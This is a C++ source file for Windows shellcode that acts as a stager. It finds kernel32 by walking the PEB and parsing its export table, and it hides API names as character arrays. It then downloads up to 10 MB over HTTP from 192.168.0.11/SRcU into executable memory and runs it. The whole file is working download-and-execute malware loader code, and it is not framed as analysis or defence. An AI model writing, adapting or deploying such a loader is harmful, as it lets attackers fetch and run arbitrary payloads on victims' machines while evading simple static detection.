#include <windows.h>
#include <cstdint>
#include <wininet.h>

#ifdef _WIN64
extern "C" DWORD64 GetK32();
#define GetK32Proc GetK32Proc64
DWORD64 GetK32Proc64(const char* proc);
#else
#define GetK32Proc GetK32Proc32
DWORD GetK32Proc32(const char* proc);
#endif

typedef HMODULE(WINAPI* LoadLibraryA_t)(
	LPCSTR lpLibFileName
	);
typedef FARPROC(WINAPI* GetProcAddress_t)(
	HMODULE hModule,
	LPCSTR  lpProcName
	);
typedef HINTERNET(WINAPI* InternetOpenA_t)(
	LPCSTR lpszAgent,
	DWORD  dwAccessType,
	LPCSTR lpszProxy,
	LPCSTR lpszProxyBypass,
	DWORD  dwFlags
	);
typedef HINTERNET(WINAPI* InternetConnectA_t)(
	HINTERNET     hInternet,
	LPCSTR        lpszServerName,
	INTERNET_PORT nServerPort,
	LPCSTR        lpszUserName,
	LPCSTR        lpszPassword,
	DWORD         dwService,
	DWORD         dwFlags,
	DWORD_PTR     dwContext
	);
typedef HINTERNET(WINAPI* HttpOpenRequestA_t)(
	HINTERNET hConnect,
	LPCSTR    lpszVerb,
	LPCSTR    lpszObjectName,
	LPCSTR    lpszVersion,
	LPCSTR    lpszReferrer,
	LPCSTR* lplpszAcceptTypes,
	DWORD     dwFlags,
	DWORD_PTR     dwContext
	);
typedef BOOL(WINAPI* HttpSendRequestA_t)(
	HINTERNET hRequest,
	LPCSTR    lpszHeaders,
	DWORD     dwHeadersLength,
	LPVOID    lpOptional,
	DWORD     dwOptionalLengthLPVOID
	);
typedef BOOL(WINAPI* InternetCloseHandle_t)(
	HINTERNET hInternet
	);
typedef LPVOID(WINAPI* VirtualAlloc_t)(
	LPVOID lpAddress,
	SIZE_T dwSize,
	DWORD  flAllocationType,
	DWORD  flProtect
	);
typedef BOOL(WINAPI* InternetReadFile_t)(
	HINTERNET hFile,
	LPVOID    lpBuffer,
	DWORD     dwNumberOfBytesToRead,
	LPDWORD   lpdwNumberOfBytesRead
	);
typedef void(WINAPI* ExitProcess_t)(
	UINT uExitCode
	);


void shellcode() {
	const char ExitProcess_s[] = { 'E','x','i','t','P','r','o','c','e','s','s',0 };
	const char VirtualAlloc_s[] = { 'V','i','r','t','u','a','l','A','l','l','o','c',0 };
	const char LoadLibraryA_s[] = { 'L','o','a','d','L','i','b','r','a','r','y','A',0 };
	const char MessageBoxA_s[] = { 'M','e','s','s','a','g','e','B','o','x','A',0 };
	const char hello_world_s[] = { 'h','e','l','l','o',' ','w','o','r','l','d',0 };
	const char user32_dll_s[] = { 'u','s','e','r','3','2','.','d','l','l',0 };
	const char GetProcAddress_s[] = { 'G','e','t','P','r','o','c','A','d','d','r','e','s','s',0 };
	const char InternetOpenA_s[] = { 'I','n','t','e','r','n','e','t','O','p','e','n','A',0 };
	const char Wininet_dll_s[] = { 'W','i','n','i','n','e','t','.','d','l','l',0 };
	const char _92_168_0_11_s[] = { '1','9','2','.','1','6','8','.','0','.','1','1',0 };
	const volatile char InternetConnectA_s[] = { 'I','n','t','e','r','n','e','t','C','o','n','n','e','c','t','A',0 };
	const volatile char HttpOpenRequestA_s[] = { 'H','t','t','p','O','p','e','n','R','e','q','u','e','s','t','A',0 };
	const volatile char HttpSendRequestA_s[] = { 'H','t','t','p','S','e','n','d','R','e','q','u','e','s','t','A',0 };
	const volatile char InternetCloseHandle_s[] = { 'I','n','t','e','r','n','e','t','C','l','o','s','e','H','a','n','d','l','e',0 };
	const volatile char InternetReadFile_s[] = { 'I','n','t','e','r','n','e','t','R','e','a','d','F','i','l','e',0 };

	ExitProcess_t MyExitProcess = (ExitProcess_t)GetK32Proc(ExitProcess_s);
	VirtualAlloc_t MyVirtualAlloc = (VirtualAlloc_t)GetK32Proc(VirtualAlloc_s);
	LoadLibraryA_t MyLoadLibrary = (LoadLibraryA_t)GetK32Proc(LoadLibraryA_s);
	GetProcAddress_t MyGetProcAddress = (GetProcAddress_t)GetK32Proc(GetProcAddress_s);
	HMODULE wininet = MyLoadLibrary(Wininet_dll_s);
	InternetOpenA_t MyInternetOpenA = (InternetOpenA_t)MyGetProcAddress(wininet, InternetOpenA_s);
	InternetConnectA_t MyInternetConnectA = (InternetConnectA_t)MyGetProcAddress(wininet, (const char*)InternetConnectA_s);
	HttpOpenRequestA_t MyHttpOpenRequestA = (HttpOpenRequestA_t)MyGetProcAddress(wininet, (const char*)HttpOpenRequestA_s);
	HttpSendRequestA_t MyHttpSendRequestA = (HttpSendRequestA_t)MyGetProcAddress(wininet, (const char*)HttpSendRequestA_s);
	InternetCloseHandle_t MyInternetCloseHandle = (InternetCloseHandle_t)MyGetProcAddress(wininet, (const char*)InternetCloseHandle_s);
	InternetReadFile_t MyInternetReadFile = (InternetReadFile_t)MyGetProcAddress(wininet, (const char*)InternetReadFile_s);

	HINTERNET hInternet = MyInternetOpenA(0, INTERNET_OPEN_TYPE_DIRECT, 0, 0, 0);
	if (!hInternet)MyExitProcess(1);
	HINTERNET hConnect = MyInternetConnectA(hInternet, _92_168_0_11_s, 80, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
	if (!hConnect)MyExitProcess(1);
	const char GET_s[] = { 'G','E','T',0 };
	const char _SRcU_s[] = { '/','S','R','c','U',0 };
	HINTERNET hRequest = MyHttpOpenRequestA(hConnect, GET_s, _SRcU_s, 0, 0, 0, INTERNET_FLAG_KEEP_CONNECTION, 0);
	if (!hRequest)MyExitProcess(1);
	BOOL bSendRequest = MyHttpSendRequestA(hRequest, 0, 0, 0, 0);
	if (!bSendRequest)MyExitProcess(1);

	void* buffer = MyVirtualAlloc(0, 10485760, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!buffer)MyExitProcess(1);

	DWORD bytesRead;
	MyInternetReadFile(hRequest, buffer, 10485760, &bytesRead);
	if (!bytesRead)MyExitProcess(1);

	MyInternetCloseHandle(hRequest);
	MyInternetCloseHandle(hConnect);
	MyInternetCloseHandle(hInternet);

	((void(*)())buffer)();
}

#ifdef _WIN64
DWORD64 GetK32Proc64(const char* proc) {
	DWORD64 k32 = GetK32();

	DWORD e_lfanew = *(DWORD*)(k32 + 60);

	DWORD export_rva = *(DWORD*)(k32 + e_lfanew + 136);

	DWORD AddressOfFunctions = *(DWORD*)(k32 + export_rva + 28);
	DWORD AddressOfNames = *(DWORD*)(k32 + export_rva + 32);
	DWORD AddressOfNameOrdinals = *(DWORD*)(k32 + export_rva + 36);

	DWORD* AddressOfFunctions_va = (DWORD*)(k32 + AddressOfFunctions);
	DWORD* AddressOfNames_va = (DWORD*)(k32 + AddressOfNames);
	WORD* AddressOfNameOrdinals_va = (WORD*)(k32 + AddressOfNameOrdinals);

	DWORD NumberOfNames = *(DWORD*)(k32 + export_rva + 24);
	for (size_t i = 0; i < NumberOfNames; i++) {
		const char* func = (const char*)(k32 + AddressOfNames_va[i]);

		const char* _proc = proc;
		while (*func && (*func == *_proc)) {
			func++;
			_proc++;
		}

		if (*(unsigned char*)func - *(unsigned char*)_proc == 0) {
			return k32 + AddressOfFunctions_va[AddressOfNameOrdinals_va[i]];
		}
	}
	return 0;
}
#else
DWORD GetK32Proc32(const char* proc) {
	DWORD k32 = 0;
	__asm
	{
		mov eax, fs: [0x30] ;
		mov eax, [eax + 0xc];
		mov eax, [eax + 0x14];
		mov eax, [eax];
		mov eax, [eax];
		mov eax, [eax + 0x10];
		mov k32, eax;
	}

	DWORD e_lfanew = *(DWORD*)(k32 + 60);

	DWORD export_rva = *(DWORD*)(k32 + e_lfanew + 120);

	DWORD AddressOfFunctions = *(DWORD*)(k32 + export_rva + 28);
	DWORD AddressOfNames = *(DWORD*)(k32 + export_rva + 32);
	DWORD AddressOfNameOrdinals = *(DWORD*)(k32 + export_rva + 36);

	DWORD* AddressOfFunctions_va = (DWORD*)(k32 + AddressOfFunctions);
	DWORD* AddressOfNames_va = (DWORD*)(k32 + AddressOfNames);
	WORD* AddressOfNameOrdinals_va = (WORD*)(k32 + AddressOfNameOrdinals);

	DWORD NumberOfNames = *(DWORD*)(k32 + export_rva + 24);
	for (size_t i = 0; i < NumberOfNames; i++) {
		const char* func = (const char*)(k32 + AddressOfNames_va[i]);

		const char* _proc = proc;
		while (*func && (*func == *_proc)) {
			func++;
			_proc++;
		}

		if (*(unsigned char*)func - *(unsigned char*)_proc == 0) {
			return k32 + AddressOfFunctions_va[AddressOfNameOrdinals_va[i]];
		}
	}
	return 0;
}
#endif
